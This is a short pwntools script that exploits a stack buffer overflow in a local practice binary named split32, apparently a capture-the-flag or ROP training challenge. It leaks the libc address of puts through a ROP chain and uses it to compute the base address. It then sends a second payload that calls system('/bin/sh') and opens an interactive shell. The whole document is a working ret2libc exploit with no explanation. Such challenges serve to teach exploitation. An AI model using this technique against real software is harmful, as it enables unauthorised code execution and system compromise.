#!/usr/bin/python 
from pwn import *

p = process("./split32")
elf = ELF("./split32")
libc = elf.libc 
p1ret = 0x80483e1

pay = 'A'*(0x28+0x4) 
pay += p32(elf.plt['puts']) + p32(p1ret) + p32(elf.got['puts'])
pay += p32(elf.symbols['pwnme'])

p.sendlineafter("> ", pay)

puts = u32(p.recv(4))
libcBase = puts - libc.symbols['puts']
system = libcBase + libc.symbols['system']
binsh = libcBase + list(libc.search("/bin/sh"))[0]
log.info("puts : "+hex(puts))

p.sendlineafter("> ", 'A'*(0x28+0x4) + p32(system) + p32(p1ret) + p32(binsh))

p.interactive()
